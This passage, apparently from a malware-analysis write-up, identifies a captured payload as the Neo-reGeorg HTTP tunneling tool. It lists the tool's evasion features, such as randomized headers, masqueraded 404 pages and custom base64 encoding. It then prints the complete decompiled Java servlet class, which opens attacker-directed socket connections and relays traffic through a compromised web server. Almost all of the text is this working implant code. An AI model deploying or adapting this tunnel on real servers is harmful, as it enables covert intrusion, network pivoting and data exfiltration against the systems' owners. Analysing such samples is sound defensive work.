The payload is actually a very famous [opensource tool](https://github.com/L-codes/Neo-reGeorg) named “Neo-reGeorg”. It is used by APTs for data exfiltration or HTTP tunneling since the tool has the capability to encrypt the traffic along with randomized http headers. This makes it hard to detect.

Moreover, most of the tool features include:

- Transfer content through out-of-order base64 encryption
- GET request response can be customized (such as masquerading 404 pages)
- HTTP Headers instructions are randomly generated to avoid feature detection
- HTTP Headers can be customized
- Custom HTTP response code
- Multiple URLs random requests
- Server-node DNS resolution
- Compatible with python2 / python3
- High compatibility of the server environment
- (only php) Refer to [pivotnacci](https://github.com/blackarrowsec/pivotnacci) to implement a single `SESSION` to create multiple TCP connections to deal with some load balancing scenarios
- aspx/ashx/jsp/jspx no longer relies on Session, and can run normally in harsh environments such as cookie-free
- (non-php) Support HTTP forwarding, coping with load balancing environment.

The entire code of *Neo-reGeorg:*

```java
package defpackage;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import javax.servlet.ServletContext;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/* renamed from: NeoreGeorg  reason: default package */
/* loaded from: 1.class */
public class NeoreGeorg {
    private char[] en;
    private byte[] de;

    public boolean equals(Object obj) {
        HttpServletRequest httpServletRequest;
        HttpServletResponse httpServletResponse;
        int intValue;
        int intValue2;
        String str;
        String str2;
        String str3;
        String str4;
        String str5;
        String str6;
        String str7;
        String str8;
        String str9;
        String str10;
        String str11;
        String str12;
        ServletContext servletContext;
        PrintWriter writer;
        String header;
        byte[] bArr;
        InputStream inputStream;
        try {
            Object[] objArr = (Object[]) obj;
            httpServletRequest = (HttpServletRequest) objArr[0];
            httpServletResponse = (HttpServletResponse) objArr[1];
            this.en = (char[]) objArr[2];
            this.de = (byte[]) objArr[3];
            int intValue3 = ((Integer) objArr[4]).intValue();
            intValue = ((Integer) objArr[5]).intValue();
            intValue2 = ((Integer) objArr[6]).intValue();
            str = (String) objArr[7];
            str2 = (String) objArr[8];
            String str13 = (String) objArr[9];
            str3 = (String) objArr[10];
            String str14 = (String) objArr[11];
            str4 = (String) objArr[12];
            str5 = (String) objArr[13];
            String str15 = (String) objArr[14];
            str6 = (String) objArr[15];
            str7 = (String) objArr[16];
            String str16 = (String) objArr[17];
            str8 = (String) objArr[18];
            str9 = (String) objArr[19];
            str10 = (String) objArr[20];
            str11 = (String) objArr[21];
            String str17 = (String) objArr[22];
            String str18 = (String) objArr[23];
            str12 = (String) objArr[24];
            String str19 = (String) objArr[25];
            servletContext = httpServletRequest.getSession().getServletContext();
            writer = httpServletResponse.getWriter();
            String header2 = httpServletRequest.getHeader(str14);
            if (header2 != null) {
                String str20 = new String(b64de(header2));
                if (!islocal(str20)) {
                    httpServletResponse.reset();
                    String method = httpServletRequest.getMethod();
                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str20).openConnection();
                    httpURLConnection.setRequestMethod(method);
                    httpURLConnection.setDoOutput(true);
                    ArrayList<String> list = Collections.list(httpServletRequest.getHeaderNames());
                    Collections.reverse(list);
                    for (String str21 : list) {
                        if (!str21.equalsIgnoreCase(str14)) {
                            httpURLConnection.setRequestProperty(headerkey(str21), httpServletRequest.getHeader(str21));
                        }
                    }
                    byte[] bArr2 = new byte[1024];
                    if (httpServletRequest.getContentLength() != -1) {
                        try {
                            OutputStream outputStream = httpURLConnection.getOutputStream();
                            ServletInputStream inputStream2 = httpServletRequest.getInputStream();
                            while (true) {
                                int read = inputStream2.read(bArr2);
                                if (read == -1) {
                                    break;
                                }
                                outputStream.write(bArr2, 0, read);
                            }
                            outputStream.flush();
                            outputStream.close();
                        } catch (Exception e) {
                            httpServletResponse.setHeader(str2, str19);
                            return false;
                        }
                    }
                    for (String str22 : httpURLConnection.getHeaderFields().keySet()) {
                        if (str22 != null && !str22.equalsIgnoreCase("Content-Length") && !str22.equalsIgnoreCase("Transfer-Encoding")) {
                            httpServletResponse.setHeader(str22, httpURLConnection.getHeaderField(str22));
                        }
                    }
                    if (httpURLConnection.getResponseCode() < 400) {
                        inputStream = httpURLConnection.getInputStream();
                    } else {
                        inputStream = httpURLConnection.getErrorStream();
                        if (inputStream == null) {
                            httpServletResponse.setStatus(intValue3);
                            return false;
                        }
                    }
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    while (true) {
                        int read2 = inputStream.read(bArr2);
                        if (read2 == -1) {
                            String str23 = new String(byteArrayOutputStream.toByteArray());
                            httpServletResponse.addHeader("Content-Length", Integer.toString(str23.length()));
                            httpServletResponse.setStatus(httpURLConnection.getResponseCode());
                            writer.write(str23);
                            writer.flush();
                            return false;
                        }
                        byte[] bArr3 = new byte[read2];
                        System.arraycopy(bArr2, 0, bArr3, 0, read2);
                        byteArrayOutputStream.write(bArr3);
                    }
                }
            }
            httpServletResponse.resetBuffer();
            httpServletResponse.setStatus(intValue3);
            header = httpServletRequest.getHeader(str13);
        } catch (Exception e2) {
            return false;
        }
        if (header != null) {
            String substring = header.substring(0, 22);
            String substring2 = header.substring(22);
            httpServletResponse.setHeader(str, str7);
            if (substring2.compareTo(str8) == 0) {
                try {
                    String[] split = new String(b64de(httpServletRequest.getHeader(str3))).split("\\|");
                    String str24 = split[0];
                    int parseInt = Integer.parseInt(split[1]);
                    SocketChannel open = SocketChannel.open();
                    open.connect(new InetSocketAddress(str24, parseInt));
                    open.configureBlocking(false);
                    servletContext.setAttribute(substring, open);
                    httpServletResponse.setHeader(str, str7);
                } catch (Exception e3) {
                    httpServletResponse.setHeader(str2, str6);
                    httpServletResponse.setHeader(str, str4);
                }
            } else if (substring2.compareTo(str9) == 0) {
                try {
                    ((SocketChannel) servletContext.getAttribute(substring)).socket().close();
                } catch (Exception e4) {
                }
                servletContext.removeAttribute(substring);
            } else if (substring2.compareTo(str10) == 0) {
                SocketChannel socketChannel = (SocketChannel) servletContext.getAttribute(substring);
                try {
                    ByteBuffer allocate = ByteBuffer.allocate(intValue);
                    int i = 0;
                    for (int read3 = socketChannel.read(allocate); read3 > 0; read3 = socketChannel.read(allocate)) {
                        byte[] bArr4 = new byte[read3];
                        System.arraycopy(allocate.array(), 0, bArr4, 0, read3);
                        writer.write(b64en(bArr4));
                        writer.flush();
                        allocate.clear();
                        i += read3;
                        if (read3 < intValue || i >= intValue2) {
                            break;
                        }
                    }
                    httpServletResponse.setHeader(str, str7);
                } catch (Exception e5) {
                    httpServletResponse.setHeader(str, str4);
                }
            } else if (substring2.compareTo(str11) == 0) {
                SocketChannel socketChannel2 = (SocketChannel) servletContext.getAttribute(substring);
                try {
                    String str25 = "";
                    ServletInputStream inputStream3 = httpServletRequest.getInputStream();
                    while (true) {
                        int available = inputStream3.available();
                        if (available == -1) {
                            break;
                        }
                        if (inputStream3.read(new byte[available]) == -1) {
                            break;
                        }
                        str25 = str25 + new String(bArr);
                    }
                    byte[] b64de = b64de(str25);
                    ByteBuffer allocate2 = ByteBuffer.allocate(b64de.length);
                    allocate2.put(b64de);
                    allocate2.flip();
                    while (allocate2.hasRemaining()) {
                        socketChannel2.write(allocate2);
                    }
                    httpServletResponse.setHeader(str, str7);
                } catch (Exception e6) {
                    httpServletResponse.setHeader(str2, str12);
                    httpServletResponse.setHeader(str, str4);
                    socketChannel2.socket().close();
                }
            }
            return false;
        }
        writer.write(str5);
        return false;
    }

    public String b64en(byte[] bArr) {
        StringBuffer stringBuffer = new StringBuffer();
        int length = bArr.length;
        int i = 0;
        while (true) {
            if (i >= length) {
                break;
            }
            int i2 = i;
            int i3 = i + 1;
            int i4 = bArr[i2] & 255;
            if (i3 == length) {
                stringBuffer.append(this.en[i4 >>> 2]);
                stringBuffer.append(this.en[(i4 & 3) << 4]);
                stringBuffer.append("==");
                break;
            }
            int i5 = i3 + 1;
            int i6 = bArr[i3] & 255;
            if (i5 == length) {
                stringBuffer.append(this.en[i4 >>> 2]);
                stringBuffer.append(this.en[((i4 & 3) << 4) | ((i6 & 240) >>> 4)]);
                stringBuffer.append(this.en[(i6 & 15) << 2]);
                stringBuffer.append("=");
                break;
            }
            i = i5 + 1;
            int i7 = bArr[i5] & 255;
            stringBuffer.append(this.en[i4 >>> 2]);
            stringBuffer.append(this.en[((i4 & 3) << 4) | ((i6 & 240) >>> 4)]);
            stringBuffer.append(this.en[((i6 & 15) << 2) | ((i7 & 192) >>> 6)]);
            stringBuffer.append(this.en[i7 & 63]);
        }
        return stringBuffer.toString();
    }

    public byte[] b64de(String str) {
        byte b;
        byte b2;
        byte b3;
        byte b4;
        byte[] bytes = str.getBytes();
        int length = bytes.length;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(length);
        int i = 0;
        while (i < length) {
            do {
                int i2 = i;
                i++;
                b = this.de[bytes[i2]];
                if (i >= length) {
                    break;
                }
            } while (b == -1);
            if (b == -1) {
                break;
            }
            do {
                int i3 = i;
                i++;
                b2 = this.de[bytes[i3]];
                if (i >= length) {
                    break;
                }
            } while (b2 == -1);
            if (b2 == -1) {
                break;
            }
            byteArrayOutputStream.write((b << 2) | ((b2 & 48) >>> 4));
            do {
                int i4 = i;
                i++;
                byte b5 = bytes[i4];
                if (b5 != 61) {
                    b3 = this.de[b5];
                    if (i >= length) {
                        break;
                    }
                } else {
                    return byteArrayOutputStream.toByteArray();
                }
            } while (b3 == -1);
            if (b3 == -1) {
                break;
            }
            byteArrayOutputStream.write(((b2 & 15) << 4) | ((b3 & 60) >>> 2));
            do {
                int i5 = i;
                i++;
                byte b6 = bytes[i5];
                if (b6 != 61) {
                    b4 = this.de[b6];
                    if (i >= length) {
                        break;
                    }
                } else {
                    return byteArrayOutputStream.toByteArray();
                }
            } while (b4 == -1);
            if (b4 == -1) {
                break;
            }
            byteArrayOutputStream.write(((b3 & 3) << 6) | b4);
        }
        return byteArrayOutputStream.toByteArray();
    }

    static String headerkey(String str) throws Exception {
        String[] split;
        String str2 = "";
        for (String str3 : str.split("-")) {
            str2 = (str2 + str3.substring(0, 1).toUpperCase() + str3.substring(1)) + "-";
        }
        return str2.substring(0, str2.length() - 1);
    }

    boolean islocal(String str) throws Exception {
        String host = new URL(str).getHost();
        Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
        while (networkInterfaces.hasMoreElements()) {
            Enumeration<InetAddress> inetAddresses = networkInterfaces.nextElement().getInetAddresses();
            while (inetAddresses.hasMoreElements()) {
                InetAddress nextElement = inetAddresses.nextElement();
                if ((nextElement instanceof Inet4Address) && nextElement.getHostAddress().equals(host)) {
                    return true;
                }
            }
        }
        return false;
    }
}
```